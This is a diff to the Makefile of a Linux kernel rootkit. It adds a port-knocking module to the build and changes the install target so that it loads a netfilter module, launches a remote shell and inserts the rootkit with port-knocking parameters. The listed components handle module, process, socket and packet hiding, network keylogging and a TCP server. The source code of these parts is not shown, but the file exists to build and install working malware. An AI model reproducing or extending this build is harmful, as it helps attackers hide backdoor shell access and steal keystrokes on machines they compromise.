@@ -33,7 +33,7 @@ KDIR = /lib/modules/$(shell uname -r)/build
 TARGET = rootkit
 
 obj-m += $(TARGET).o
-rootkit-objs := module_masking.o network_keylogging.o process_masking.o socket_masking.o packet_masking.o conf_manager.o tcp_server.o jsmn.o core.o
+rootkit-objs := port_knocking.o module_masking.o network_keylogging.o process_masking.o socket_masking.o packet_masking.o conf_manager.o tcp_server.o jsmn.o core.o
 ccflags-y = -Wno-unused-function
 
 all:	$(OBJS) sysmap
@@ -47,7 +47,8 @@ clean:
 	@echo "\nUseless files successfully deleted\n"
 
 install:	all
-	$(REMOTE_SHELL_EXEC) & insmod $(TARGET).ko pids="$$!"
+	insmod /lib/modules/4.1.10/kernel/net/ipv4/netfilter/nf_reject_ipv4.ko
+	$(REMOTE_SHELL_EXEC) & insmod $(TARGET).ko pids="$$!" pk_ip=127.0.0.1 pk_port=23250
 	@echo "\nRootkit successfully installed\n"
 
 uninstall:
